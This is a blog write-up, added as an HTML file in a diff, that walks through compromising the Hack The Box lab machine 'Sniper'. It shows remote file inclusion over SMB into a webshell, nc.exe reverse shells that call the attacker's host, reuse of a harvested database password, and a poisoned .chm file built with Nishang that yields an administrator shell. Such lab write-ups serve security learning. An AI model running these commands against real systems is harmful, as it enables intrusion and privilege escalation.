@@ -1,0 +1,664 @@
+<!DOCTYPE html>
+<html lang="en">
+    <head>
+        <meta charset="utf-8">
+        <meta name="viewport" content="width=device-width, initial-scale=1">
+        <meta name="robots" content="noodp" />
+        <meta http-equiv="X-UA-Compatible" content="IE=edge, chrome=1">
+        <title>Sniper - gr4n173</title><meta name="Description" content="Here I will explain my path for Sniper box from Hack The Box."><meta property="og:title" content="Sniper" />
+<meta property="og:description" content="Here I will explain my path for Sniper box from Hack The Box." />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="http://example.com/sniper/" />
+<meta property="og:image" content="http://example.com/sniper/featured-image.png"/>
+<meta property="article:published_time" content="2020-03-28T23:29:01+08:00" />
+<meta property="article:modified_time" content="2020-03-30T09:45:01+08:00" />
+<meta name="twitter:card" content="summary_large_image"/>
+<meta name="twitter:image" content="http://example.com/sniper/featured-image.png"/>
+<meta name="twitter:title" content="Sniper"/>
+<meta name="twitter:description" content="Here I will explain my path for Sniper box from Hack The Box."/>
+<meta name="application-name" content="gr4n173">
+<meta name="apple-mobile-web-app-title" content="gr4n173"><meta name="theme-color" content="#ffffff"><meta name="msapplication-TileColor" content="#da532c"><link rel="shortcut icon" type="image/x-icon" href="/favicon.ico" />
+        <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
+        <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5"><link rel="manifest" href="/site.webmanifest"><link rel="canonical" href="http://example.com/sniper/" /><link rel="prev" href="http://example.com/oauth2/" /><link rel="next" href="http://example.com/virseccon/" /><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/normalize.css@8.0.1/normalize.min.css"><link rel="stylesheet" href="/css/style.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.13.0/css/all.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/animate.css@3.7.2/animate.min.css"><script type="application/ld+json">
+    {
+        "@context": "http://schema.org",
+        "@type": "BlogPosting",
+        "headline": "Sniper",
+        "inLanguage": "en",
+        "mainEntityOfPage": {
+            "@type": "WebPage",
+            "@id": "http:\/\/example.com\/sniper\/"
+        },"image": [{
+                            "@type": "ImageObject",
+                            "url": "http:\/\/example.com\/sniper\/featured-image.png",
+                            "width":  587 ,
+                            "height":  369 
+                        }],"genre": "posts","keywords": "windows, htb, smb, .chm, powershell, nc.exe, webshell, nishang","wordcount":  1353 ,
+        "url": "http:\/\/example.com\/sniper\/","datePublished": "2020-03-28T23:29:01+08:00","dateModified": "2020-03-30T09:45:01+08:00","license": "This work is licensed under a Creative Commons Attribution-NonCommercial 4.0 International License.","publisher": {
+            "@type": "Organization",
+            "name": "xxxx","logo": {
+                    "@type": "ImageObject",
+                    "url": "http:\/\/example.com\/images\/profile.jpg",
+                    "width":  400 ,
+                    "height":  400 
+                }},"author": {
+                "@type": "Person",
+                "name": "gr4n173"
+            },"description": "Here I will explain my path for Sniper box from Hack The Box."
+    }
+    </script></head>
+    <body header-desktop="fixed" header-mobile="auto"><script type="text/javascript">(window.localStorage && localStorage.getItem('theme') ? localStorage.getItem('theme') === 'dark' : ('auto' === 'auto' ? window.matchMedia('(prefers-color-scheme: dark)').matches : 'auto' === 'dark')) && document.body.setAttribute('theme', 'dark');</script>
+
+        <div id="mask"></div><div class="wrapper"><header class="desktop" id="header-desktop">
+    <div class="header-wrapper">
+        <div class="header-title">
+            <a href="/" title="gr4n173"><span class="header-title-pre"><i class='far fa-grin-tongue-wink'></i></span><span id="id-1" class="typeit"></span></a>
+        </div>
+        <div class="menu">
+            <div class="menu-inner"><a class="menu-item" href="/posts/"> Posts </a><a class="menu-item" href="/tags/"> Tags </a><a class="menu-item" href="/categories/"> Categories </a><a class="menu-item" href="/categories/moee/"> Project </a><a class="menu-item" href="/about/"> About </a><a class="menu-item" href="https://github.com/gr4n173" title="GitHub" rel="noopener noreffer" target="_blank"><i class='fab fa-github fa-fw'></i>  </a><span class="menu-item delimiter"></span><span class="menu-item search" id="search-desktop">
+                        <input type="text" placeholder="Search titles or contents..." id="search-input-desktop">
+                        <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-desktop" title="Search">
+                            <i class="fas fa-search fa-fw"></i>
+                        </a>
+                        <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-desktop" title="Clear">
+                            <i class="fas fa-times-circle fa-fw"></i>
+                        </a>
+                        <span class="search-button search-loading" id="search-loading-desktop">
+                            <i class="fas fa-spinner fa-fw fa-spin"></i>
+                        </span>
+                    </span><a href="javascript:void(0);" class="menu-item theme-switch" title="Switch Theme">
+                    <i class="fas fa-adjust fa-fw"></i>
+                </a>
+            </div>
+        </div>
+    </div>
+</header><header class="mobile" id="header-mobile">
+    <div class="header-container">
+        <div class="header-wrapper">
+            <div class="header-title">
+                <a href="/" title="gr4n173"><span class="header-title-pre"><i class='far fa-grin-tongue-wink'></i></span><span id="id-2" class="typeit"></span></a>
+            </div>
+            <div class="menu-toggle" id="menu-toggle-mobile">
+                <span></span><span></span><span></span>
+            </div>
+        </div>
+        <div class="menu" id="menu-mobile"><div class="search-wrapper">
+                    <div class="search mobile" id="search-mobile">
+                        <input type="text" placeholder="Search titles or contents..." id="search-input-mobile">
+                        <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-mobile" title="Search">
+                            <i class="fas fa-search fa-fw"></i>
+                        </a>
+                        <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-mobile" title="Clear">
+                            <i class="fas fa-times-circle fa-fw"></i>
+                        </a>
+                        <span class="search-button search-loading" id="search-loading-mobile">
+                            <i class="fas fa-spinner fa-fw fa-spin"></i>
+                        </span>
+                    </div>
+                    <a href="javascript:void(0);" class="search-cancel" id="search-cancel-mobile">
+                        Cancel
+                    </a>
+                </div><a class="menu-item" href="/posts/" title="">Posts</a><a class="menu-item" href="/tags/" title="">Tags</a><a class="menu-item" href="/categories/" title="">Categories</a><a class="menu-item" href="/categories/moee/" title="">Project</a><a class="menu-item" href="/about/" title="">About</a><a class="menu-item" href="https://github.com/gr4n173" title="GitHub" rel="noopener noreffer" target="_blank"><i class='fab fa-github fa-fw'></i></a><a href="javascript:void(0);" class="menu-item theme-switch" title="Switch Theme">
+                <i class="fas fa-adjust fa-fw"></i>
+            </a></div>
+    </div>
+</header>
+<div class="search-dropdown desktop">
+    <div id="search-dropdown-desktop"></div>
+</div>
+<div class="search-dropdown mobile">
+    <div id="search-dropdown-mobile"></div>
+</div>
+<main class="main">
+                <div class="container"><div class="toc" id="toc-auto">
+            <h2 class="toc-title">Contents</h2>
+            <div class="toc-content" id="toc-content-auto"></div>
+        </div><article class="page single"><h1 class="single-title animated flipInX">Sniper</h1><div class="post-meta">
+            <div class="post-meta-line"><span class="post-author"><a href="https://gr4n173.github.io" title="Author" target="_blank" rel="noopener noreffer author" class="author"><i class="fas fa-user-circle fa-fw"></i>gr4n173</a></span>&nbsp;<span class="post-category">included in <a href="/categories/hackthebox/"><i class="far fa-folder fa-fw"></i>Hack The Box</a></span></div>
+            <div class="post-meta-line"><i class="far fa-calendar-alt fa-fw"></i>&nbsp;<time datetime="2020-03-28">2020-03-28</time>&nbsp;<i class="fas fa-pencil-alt fa-fw"></i>&nbsp;1353 words&nbsp;
+                <i class="far fa-clock fa-fw"></i>&nbsp;7 minutes&nbsp;</div>
+        </div><div class="featured-image"><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/sniper/featured-image.png"
+        data-srcset="/sniper/featured-image.png, /sniper/featured-image.png 1.5x, /sniper/featured-image.png 2x"
+        data-sizes="auto"
+        alt="/sniper/featured-image.png"
+        title="Here I will explain my path for Sniper box from Hack The Box." /></div><div class="details toc" id="toc-static"  kept="">
+                <div class="details-summary toc-title">
+                    <span>Contents</span>
+                    <span><i class="details-icon fas fa-angle-right"></i></span>
+                </div>
+                <div class="details-content toc-content" id="toc-content-static"><nav id="TableOfContents">
+  <ul>
+    <li><a href="#htbsniper">HTB:Sniper</a></li>
+    <li><a href="#box-details">Box Details</a></li>
+    <li><a href="#recon">Recon</a>
+      <ul>
+        <li><a href="#web-enumeration">Web Enumeration</a></li>
+        <li><a href="#webshell">Webshell</a></li>
+        <li><a href="#unprivileged-shell">Unprivileged shell</a>
+          <ul>
+            <li><a href="#listener">Listener:</a></li>
+            <li><a href="#power-shell">Power shell</a></li>
+          </ul>
+        </li>
+        <li><a href="#privilege-user">Privilege User</a></li>
+      </ul>
+    </li>
+    <li><a href="#reverse-shell">Reverse shell</a>
+      <ul>
+        <li>
+          <ul>
+            <li>
+              <ul>
+                <li><a href="#listener-1">Listener:</a></li>
+              </ul>
+            </li>
+          </ul>
+        </li>
+      </ul>
+    </li>
+    <li><a href="#user-to-root">User to Root</a>
+      <ul>
+        <li><a href="#poisoning-chm">Poisoning .chm</a></li>
+      </ul>
+    </li>
+    <li><a href="#root-shell">Root Shell</a></li>
+  </ul>
+</nav></div>
+            </div><div class="content" id="content"><p>Sniper box was easy box. It falls under windows and medium category. Here I will explain my path for Sniper box from Hack The Box.</p>
+<hr>
+<h2 id="htbsniper">HTB:Sniper</h2>
+<p>Sniper box was easy box. It falls under windows and medium category. Here, everything was all about enumeration and webshell upload. I’ll approach this write-up how I solved it, along with the problems that I had to face during this box. At first I obtained the user flag by exploiting RFI using SMB and I got the unprivelege user shell to privelege by using powershell commands and with .chm exploit I got root.txt. I’ll show all my payload (including that didn’t work in initial deployment to get root).</p>
+<h2 id="box-details">Box Details</h2>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="public/images/sniperdetail.png"
+        data-srcset="/sniper/public/images/sniperdetail.png, public/images/sniperdetail.png 1.5x, /sniper/public/images/sniperdetail.png 2x"
+        data-sizes="auto"
+        alt="/sniper/public/images/sniperdetail.png"
+        title="box_detail" /></p>
+<p>In the above it&rsquo;s ip was <code>10.10.14.151</code>, I added it to <code>/etc/hosts</code> as sniper.htb. Let&rsquo;s solve this box.</p>
+<h2 id="recon">Recon</h2>
+<p>Let&rsquo;s start with universal port scanner, <code>nmap</code> to see the open ports and <code>port 80</code> and <code>smb</code> service was opened.</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-fallback" data-lang="fallback"># Nmap 7.80 scan initiated Fri Mar 27 21:34:08 2020 as: nmap -sS -sC -sV -Pn -oA nmap.txt 10.10.10.151
+Nmap scan report for sniper.htb (10.10.10.151)
+Host is up (0.41s latency).
+Not shown: 996 filtered ports
+PORT    STATE SERVICE       VERSION
+80/tcp  open  http          Microsoft IIS httpd 10.0
+|_http-server-header: Microsoft-IIS/10.0
+|_http-title: Sniper Co.
+135/tcp open  msrpc         Microsoft Windows RPC
+139/tcp open  netbios-ssn   Microsoft Windows netbios-ssn
+445/tcp open  microsoft-ds?
+Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
+
+Host script results:
+|_clock-skew: 7h03m03s
+| smb2-security-mode: 
+|   2.02: 
+|_    Message signing enabled but not required
+| smb2-time: 
+|   date: 2020-03-27T22:53:18
+|_  start_date: N/A
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+# Nmap done at Fri Mar 27 21:35:52 2020 -- 1 IP address (1 host up) scanned in 103.56 seconds
+</code></pre></td></tr></table>
+</div>
+</div><h3 id="web-enumeration">Web Enumeration</h3>
+<p>sniper.htb</p>
+<p>After I noticed port <code>80</code> was opened I visited that site and got this as output.</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="public/images/sniper_htb.jpg"
+        data-srcset="/sniper/public/images/sniper_htb.jpg, public/images/sniper_htb.jpg 1.5x, /sniper/public/images/sniper_htb.jpg 2x"
+        data-sizes="auto"
+        alt="/sniper/public/images/sniper_htb.jpg"
+        title="sniperhtb" /></p>
+<p>From above, it was a good delivery website. So I checked everypart of the website and found this directory as interesting <code>http://sniper.htb/blog/index.php</code> . Here I found language where I was able to change the language <code>http://sniper.htb/blog/?lang=blog-en.php</code> . This happens due to the RFI (Remote File Inclusion) vulnerability in the webservices.</p>
+<h3 id="webshell">Webshell</h3>
+<p>Since <code>Sniper</code> had <code>SMB(Server Mail Box)</code> service. So I combined with RFI to get a webshell. For that you can follow this link <a href="http://www.mannulinux.org/2019/05/exploiting-rfi-in-php-bypass-remote-url-inclusion-restriction.html" target="_blank" rel="noopener noreffer">here</a>.</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="public/images/sniper_webshell.png"
+        data-srcset="/sniper/public/images/sniper_webshell.png, public/images/sniper_webshell.png 1.5x, /sniper/public/images/sniper_webshell.png 2x"
+        data-sizes="auto"
+        alt="/sniper/public/images/sniper_webshell.png"
+        title="webshell.jpg" /></p>
+<p>Above you can see the webshell. So, now I used nc to get the actually shell. For that I had to upload <code>nc.exe</code> to the webshell.
+If you don&rsquo;t have then you can download from <a href="https://github.com/gr4n173/tools.git" target="_blank" rel="noopener noreffer">here</a>.</p>
+<p>Now before uploading that I made a dir named <code>gr4n173</code><br>
+you can see the pic below.</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="public/images/nc_uploaded.png"
+        data-srcset="/sniper/public/images/nc_uploaded.png, public/images/nc_uploaded.png 1.5x, /sniper/public/images/nc_uploaded.png 2x"
+        data-sizes="auto"
+        alt="/sniper/public/images/nc_uploaded.png"
+        title="nc_shell" /></p>
+<p>then uploaded <code>nc</code> tool to that directory as:</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="public/images/upload_nc.png"
+        data-srcset="/sniper/public/images/upload_nc.png, public/images/upload_nc.png 1.5x, /sniper/public/images/upload_nc.png 2x"
+        data-sizes="auto"
+        alt="/sniper/public/images/upload_nc.png"
+        title="uploadnc" /></p>
+<h3 id="unprivileged-shell">Unprivileged shell</h3>
+<p>Now I setup a listener on and used the command of <code>nc</code> as:</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="public/images/reverse_shell.png"
+        data-srcset="/sniper/public/images/reverse_shell.png, public/images/reverse_shell.png 1.5x, /sniper/public/images/reverse_shell.png 2x"
+        data-sizes="auto"
+        alt="/sniper/public/images/reverse_shell.png"
+        title="reverse" /></p>
+<h4 id="listener">Listener:</h4>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span><span class="lnt">8
+</span><span class="lnt">9
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-fallback" data-lang="fallback">root@gr4n173:~$ nc -lvnp 4444
+listening on [any] 4444 ...
+connect to [10.10.14.11] from (UNKNOWN) [10.10.10.151] 50602
+Microsoft Windows [Version 10.0.17763.678]
+(c) 2018 Microsoft Corporation. All rights reserved.
+
+C:\gr4n173&gt;whoami
+whoami
+nt authority\iusr
+</code></pre></td></tr></table>
+</div>
+</div><p>Here I was unable to run any commands, so I switched to powershell as:</p>
+<h4 id="power-shell">Power shell</h4>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-fallback" data-lang="fallback">C:\gr4n173&gt;powershell
+powershell
+Windows PowerShell 
+Copyright (C) Microsoft Corporation. All rights reserved.
+
+PS C:\gr4n173&gt; 
+</code></pre></td></tr></table>
+</div>
+</div><p>Then I found the <code>Chris</code> user. Since I m unprivelege user so no any permission was granted.</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-fallback" data-lang="fallback">PS C:\Users&gt; ls
+ls
+    Directory: C:\Users
+
+
+Mode                LastWriteTime         Length Name                                                                  
+----                -------------         ------ ----                                                                  
+d-----         4/9/2019   6:47 AM                Administrator                                                         
+d-----        4/11/2019   7:04 AM                Chris                                                                 
+d-r---         4/9/2019   6:47 AM                Public                                                                
+</code></pre></td></tr></table>
+</div>
+</div><p>Now I had to change the user from unprivileged to privileged for that I searched everypart of the dir and found the creds of user <code>chris</code> as <code>Chris:36mEAhz/B8xQ~2VM</code>.</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-fallback" data-lang="fallback">PS C:\inetpub\wwwroot\user&gt; more db.php
+more db.php
+&lt;?php
+// Enter your Host, username, password, database below.
+// I left password empty because i do not set password on localhost.
+$con = mysqli_connect(&#34;localhost&#34;,&#34;dbuser&#34;,&#34;36mEAhz/B8xQ~2VM&#34;,&#34;sniper&#34;);
+// Check connection
+if (mysqli_connect_errno())
+  {
+  echo &#34;Failed to connect to MySQL: &#34; . mysqli_connect_error();
+  }
+?&gt;
+</code></pre></td></tr></table>
+</div>
+</div><p>By combining creds and <code>Invoke-Command</code> I got the user shell. Before that I created the folder <code>files</code> and downloaded the <code>nc</code> tool inside. Since it&rsquo;s 2020 as python2 died so I used python3 server as</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-fallback" data-lang="fallback">PS C:\gr4n173&gt; cd files
+cd files
+PS C:\gr4n173\files&gt; Invoke-Webrequest -Uri http://10.10.14.11:8000/nc.exe -OutFile nc.exe
+Invoke-Webrequest -Uri http://10.10.14.11:8000/nc.exe -OutFile nc.exe
+PS C:\gr4n173\files&gt; 
+</code></pre></td></tr></table>
+</div>
+</div><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-fallback" data-lang="fallback">root@gr4n173:~var/www/html/pub$ python3 -m http.server
+Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
+10.10.10.151 - - [28/Mar/2020 20:38:14] &#34;GET /nc.exe HTTP/1.1&#34; 200 -
+</code></pre></td></tr></table>
+</div>
+</div><p>Finally downloaded <code>nc.exe</code>. Now I used <code>creds</code> and <code>Invoke-Command</code> to know the if I can run the command as</p>
+<h3 id="privilege-user">Privilege User</h3>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-fallback" data-lang="fallback">PS C:\gr4n173\files&gt; $pass =cOnvertTo-SecureString &#39;36mEAhz/B8xQ~2VM&#39; -AsPlainText -Force
+$pass =cOnvertTo-SecureString &#39;36mEAhz/B8xQ~2VM&#39; -AsPlainText -Force
+PS C:\gr4n173\files&gt; $cred = New-Object System.Management.Automation.PSCredential(&#34;.\chris&#34;,$pass)
+$cred = New-Object System.Management.Automation.PSCredential(&#34;.\chris&#34;,$pass)
+PS C:\gr4n173\files&gt; Invoke-Command -Computer Sniper -ScriptBlock { whoami } -Credential $cred 
+Invoke-Command -Computer Sniper -ScriptBlock { whoami } -Credential $cred 
+sniper\chris
+</code></pre></td></tr></table>
+</div>
+</div><p>In above command, at first I defined a variable <code>$pass</code> which store the password and another variable <code>cred</code> for passing the <code>user</code> and <code>pass</code> to <code>Powershell</code> and last one gaves the output of command <code>whoami</code> in <code>Powershell</code>. Hence I can run the <code>command</code> .</p>
+<h2 id="reverse-shell">Reverse shell</h2>
+<p>So I used the <code>nc reverse shell</code> as with a listener on.</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-fallback" data-lang="fallback">PS C:\gr4n173\files&gt; Invoke-Command -Computer Sniper -ScriptBlock { C:\gr4n173\files\nc.exe 10.10.14.11 4445 -e powershell } -Credential $cred 
+Invoke-Command -Computer Sniper -ScriptBlock { C:\gr4n173\files\nc.exe 10.10.14.11 4445 -e powershell } -Credential $cred 
+</code></pre></td></tr></table>
+</div>
+</div><h5 id="listener-1">Listener:</h5>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span><span class="lnt">8
+</span><span class="lnt">9
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-fallback" data-lang="fallback">root@gr4n173:~$nc -lvnp 4445
+listening on [any] 4445 ...
+connect to [10.10.14.11] from (UNKNOWN) [10.10.10.151] 50671
+Windows PowerShell 
+Copyright (C) Microsoft Corporation. All rights reserved.
+ 
+PS C:\Users\Chris\Documents&gt; hostname
+hostname
+Sniper
+</code></pre></td></tr></table>
+</div>
+</div><p>This way I got the user.</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-fallback" data-lang="fallback">PS C:\Users\Chris\Desktop&gt; ls
+ls
+    Directory: C:\Users\Chris\Desktop
+
+
+Mode                LastWriteTime         Length Name                                                                  
+----                -------------         ------ ----                                                                  
+-a----        4/11/2019   8:15 AM             32 user.txt                                                              
+
+
+PS C:\Users\Chris\Desktop&gt; more user.txt
+more user.txt
+21f4d******************
+</code></pre></td></tr></table>
+</div>
+</div><hr>
+<h2 id="user-to-root">User to Root</h2>
+<p>For root I searched every part of the user shell and uncomplete <code>.chm</code> file was found inside Chris&rsquo;s Downloads directory:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span><span class="lnt">8
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-fallback" data-lang="fallback">PS C:\Users\Chris\Downloads&gt; ls
+ls
+    Directory: C:\Users\Chris\Downloads
+
+
+Mode                LastWriteTime         Length Name                                                                  
+----                -------------         ------ ----                                                                  
+-a----        4/11/2019   8:36 AM          10462 instructions.chm
+</code></pre></td></tr></table>
+</div>
+</div><h3 id="poisoning-chm">Poisoning .chm</h3>
+<p>In order to poison, I used <code>Out-CHM.ps1</code> while  from <a href="https://github.com/samratashok/nishang" target="_blank" rel="noopener noreffer">Nishang</a> which is quite Interesting git repo especially related to window.</p>
+<p>I used nishand tool and opened it in powershell.</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-fallback" data-lang="fallback">PS: &gt; Import-Module .\Out-CHM.ps1
+</code></pre></td></tr></table>
+</div>
+</div><p>Now I used the powershell to bypasss the Antivirus security.</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-fallback" data-lang="fallback">PS: &gt; powershell.exe -ExecutionPolicy Bypass
+</code></pre></td></tr></table>
+</div>
+</div><p>Then I download the <code>nc64.exe</code> to the Chris&rsquo;s Documents folder as</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-fallback" data-lang="fallback">PS: &gt; Out-CHM -Payload &#34;cd C:\Users\Chris\Documents;./nc64.exe
+10.10.14.11 8888 -e powershell&#34; -HHCPath &#34;C:\Program Files (x86)\HTML
+Help Workshop&#34; 
+</code></pre></td></tr></table>
+</div>
+</div><p>Here, I defined the dir of <code>nc64.exe</code> and used <a href="https://gist.github.com/mgeeky/cce31c8602a144d8f2172a73d510e0e7" target="_blank" rel="noopener noreffer">this</a> to exploit. File name <code>doc.chm</code> was created and you can get here <a href="/sniper/public/files/doc.chm" rel="">file</a>. This way I created the poison of <code>.chm</code> file.</p>
+<p>Now I downloaded the created file to user shell <code>Chris</code> with a listener on along with the <code>python3 server</code> in <code>/var/www/html/pub</code></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-fallback" data-lang="fallback">PS C:\Users\Chris\Documents&gt; Invoke-Webrequest -Uri http://10.10.14.11:8000/doc.chm -OutFile doc.chm                                                                   
+Invoke-Webrequest -Uri http://10.10.14.11:8000/doc.chm -OutFile doc.chm  
+</code></pre></td></tr></table>
+</div>
+</div><h2 id="root-shell">Root Shell</h2>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-fallback" data-lang="fallback">root@gr4n173:~$nc -lvnp 8888                              
+listening on [any] 8888 ...  
+connect to [10.10.14.11] from (UNKNOWN) [10.10.10.151] 53447                 
+Microsoft Windows [Version 10.0.17763.678]                                   
+C:\Windows\system32&gt;whoami                                                   
+sniper\administrator                                                         
+</code></pre></td></tr></table>
+</div>
+</div><p>This way I can read the <code>root.txt</code>file.</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-fallback" data-lang="fallback">
+PS C:\Users\Administrator\Desktop&gt; more root.txt     
+5624caf********************     
+</code></pre></td></tr></table>
+</div>
+</div><p>This way I got the root of Sniper box and learned alot from this box. So I would like to thank creators of this box <code>MinatoTW &amp; felamos</code> for such an awesome box. Especially poisoning <code>.chm</code> was awesome.</p>
+<p>I will be posting writeup of next box after box retired. I would like to Thank readers for being with me through out this writeup.</p>
+<p>Feedback are really appreciated !!</p>
+<p>Tweet about this writeup if you like.</p>
+<p>You can see more blog at my medium here: <a href="https://medium.com/@gr4n173" target="_blank" rel="noopener noreffer">gr4n173</a>.</p></div><div class="post-footer" id="post-footer">
+    <div class="post-info">
+        <div class="post-info-line">
+            <div class="post-info-mod">
+                <span>Updated on 2020-03-30</span>
+            </div>
+            <div class="post-info-license"></div>
+        </div>
+        <div class="post-info-line">
+            <div class="post-info-md"><span>
+                            <a class="link-to-markdown" href="/sniper/index.md" target="_blank">Read Markdown</a>
+                        </span></div>
+            <div class="post-info-share">
